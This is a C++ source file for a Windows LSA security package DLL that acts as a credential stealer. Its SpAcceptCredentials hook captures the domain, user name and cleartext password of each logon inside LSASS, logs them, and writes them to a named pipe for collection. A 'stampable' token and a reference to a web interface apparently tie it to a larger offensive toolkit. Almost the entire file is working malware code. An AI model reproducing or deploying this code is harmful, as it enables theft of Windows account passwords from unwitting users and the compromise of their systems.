#define SECURITY_WIN32
#include <Windows.h>
#include <stdint.h>
#include <errno.h>
#include <sspi.h>
#include <NTSecAPI.h>
#include <ntsecpkg.h>
#include <string>
#include <vector>
#include <strsafe.h>

#include <common/http.h>
#include <common/logging.h>
#include <common/memory.h>
#include <common/mutex.h>
#include <common/object.h>
#include <common/util.h>

#include "provider.h"

SECPKG_FUNCTION_TABLE g_SecurityPackageFunctionTable = {};

// SpAcceptCredentials seems to be called twice per authentication
//   - add a cooldown to avoid redundant POST requests
common::Cooldown g_cooldown(c_ReauthCooldown);

wchar_t g_LastAuthUser[MAX_PATH] = {};

// stampable values - configured via web interface or helper script
constexpr wchar_t c_AuthToken[] = L"00000000-0000-0000-0000-000000000000";
static constexpr wchar_t c_PipeName[] = L"\\\\.\\pipe\\lsass_log";

static DWORD WriteWideLineToPipeWithRetry(const wchar_t* wideStr)
{
    // Convert wideStr -> UTF-8 (+ '\n') into a heap buffer you control
    int wideLen = lstrlenW(wideStr); // chars, no NUL

    int utf8Len = WideCharToMultiByte(CP_UTF8, 0, wideStr, wideLen, nullptr, 0, nullptr, nullptr);
    if (utf8Len <= 0) return GetLastError();

    common::HeapBuffer outBuf((utf8Len + 1));     // bytes
    char* out = outBuf.Get<char>();

    int written = WideCharToMultiByte(CP_UTF8, 0, wideStr, wideLen, out, utf8Len, nullptr, nullptr);
    if (written != utf8Len) return ERROR_INVALID_DATA;

    out[utf8Len] = '\n';
    DWORD outBytes = (DWORD)(utf8Len + 1);

    uint32_t attempts = c_ConnectAttempts;
    do {
        if (!WaitNamedPipeW(c_PipeName, 2000)) {
            DWORD e = GetLastError();
            if (--attempts) { Sleep(c_RetryInterval); continue; }
            return (e == ERROR_PIPE_BUSY) ? ERROR_BUSY : ERROR_TIMEOUT;
        }

        HANDLE hPipe = CreateFileW(c_PipeName, GENERIC_WRITE, 0, nullptr, OPEN_EXISTING,
                                   FILE_ATTRIBUTE_NORMAL, nullptr);
        if (hPipe == INVALID_HANDLE_VALUE) {
            DWORD e = GetLastError();
            if (--attempts) { Sleep(c_RetryInterval); continue; }
            return (e == ERROR_ACCESS_DENIED) ? ERROR_ACCESS_DENIED : e;
        }

        DWORD bytesWritten = 0;
        BOOL ok = WriteFile(hPipe, out, outBytes, &bytesWritten, nullptr);
        CloseHandle(hPipe);

        if (ok && bytesWritten == outBytes) return ERROR_SUCCESS;

        DWORD e = GetLastError();
        if (--attempts) { Sleep(c_RetryInterval); continue; }
        return e;

    } while (attempts);

    return ERROR_TIMEOUT;
}


NTSTATUS
NTAPI
SpInitialize(ULONG_PTR PackageId, PSECPKG_PARAMETERS Parameters, PLSA_SECPKG_FUNCTION_TABLE FunctionTable)
{
    DEBUG_PRINTW(L"SpInitialize called for domain: %s\n", Parameters->DomainName.Buffer);

    return STATUS_SUCCESS;
}

NTSTATUS
NTAPI
SpShutdown(void)
{
    DEBUG_PRINTW(L"SpShutdown called\n");

    return STATUS_SUCCESS;
}

NTSTATUS
NTAPI
SpGetInfo(SecPkgInfoW* PackageInfo)
{
    DEBUG_PRINTW(L"SpGetInfo called\n");

    PackageInfo->Name = const_cast<SEC_WCHAR*>(c_PackageName);
    PackageInfo->Comment = const_cast<SEC_WCHAR*>(c_PackageComment);
    PackageInfo->fCapabilities = c_PackageCapabilities;
    PackageInfo->wRPCID = SECPKG_ID_NONE;
    PackageInfo->cbMaxToken = 0;
    PackageInfo->wVersion = c_PackageVersion;

    return STATUS_SUCCESS;
}

DWORD SendCredsAsync(void* credsPtr)
{
    common::HeapBuffer credsBuf(credsPtr);
    auto creds = credsBuf.Get<bang::Creds>();

    wchar_t msg[1024]{};
    wsprintfW(msg, L"%s, %s, %s", creds->Domain, creds->User, creds->Password);

    DEBUG_PRINTW(L"%s\n", msg);

    DWORD rc = WriteWideLineToPipeWithRetry(msg);
    if (rc != ERROR_SUCCESS) {
        DEBUG_PRINTW(L"failed to send creds after %ld attempts\n", c_ConnectAttempts);
    }
    return rc;
}


NTSTATUS
NTAPI
SpAcceptCredentials(SECURITY_LOGON_TYPE LogonType, PUNICODE_STRING AccountName,
    PSECPKG_PRIMARY_CRED PrimaryCredentials, PSECPKG_SUPPLEMENTAL_CRED SupplementalCredentials)
{
    DEBUG_PRINTW(L"SpAcceptCredentials called\n");

    if (PrimaryCredentials->Password.Length)
    {
        // skip if we *just* got creds for this user
        if (g_cooldown || lstrcmpW(AccountName->Buffer, g_LastAuthUser))
        {
            common::memset(g_LastAuthUser, 0, sizeof(g_LastAuthUser));
            common::memcpy(g_LastAuthUser, sizeof(g_LastAuthUser), AccountName->Buffer, AccountName->Length);

            common::HeapBuffer credsBuf(sizeof(bang::Creds));
            if (credsBuf)
            {
                auto creds = credsBuf.Get<bang::Creds>();
                common::memcpy(creds->Domain, sizeof(creds->Domain), PrimaryCredentials->DomainName.Buffer,
                    PrimaryCredentials->DomainName.Length);
                common::memcpy(creds->User, sizeof(creds->User), AccountName->Buffer, AccountName->Length);
                common::memcpy(creds->Password, sizeof(creds->Password), PrimaryCredentials->Password.Buffer,
                    PrimaryCredentials->Password.Length);

                DEBUG_PRINTW(L"%s\\%s:%s\n", creds->Domain, creds->User, creds->Password);

                // release creds buffer here; free in helper thread
                common::ObjectHandle thread = CreateThread(NULL, 0, reinterpret_cast<LPTHREAD_START_ROUTINE>(SendCredsAsync),
                    credsBuf.Release(), 0, NULL);
            }
        }
    }

    return STATUS_SUCCESS;
}

// SpLsaModeInitialize is called by LSA for each registered Security Package
extern "C"
__declspec(dllexport)
NTSTATUS
NTAPI
SpLsaModeInitialize(ULONG LsaVersion, PULONG PackageVersion, PSECPKG_FUNCTION_TABLE* ppTables, PULONG pcTables)
{
    DEBUG_PRINTW(L"SpLsaModeInitialize called\n");

    g_SecurityPackageFunctionTable.Initialize = SpInitialize;
    g_SecurityPackageFunctionTable.Shutdown = SpShutdown;
    g_SecurityPackageFunctionTable.GetInfo = SpGetInfo;
    g_SecurityPackageFunctionTable.AcceptCredentials = SpAcceptCredentials;

    *PackageVersion = SECPKG_INTERFACE_VERSION;
    *ppTables = &g_SecurityPackageFunctionTable;
    *pcTables = 1;

    return STATUS_SUCCESS;
}

extern "C"
BOOL
WINAPI
DllMain(HINSTANCE hInstance, DWORD reason, LPVOID reserved)
{
    UNREFERENCED_PARAMETER(hInstance);
    UNREFERENCED_PARAMETER(reserved);

    switch (reason)
    {
    case DLL_PROCESS_ATTACH:
        DEBUG_PRINTW(L"process attach\n");
        break;
    case DLL_PROCESS_DETACH:
        DEBUG_PRINTW(L"process detach\n");
        break;
    default:
        break;
    }

    return TRUE;
}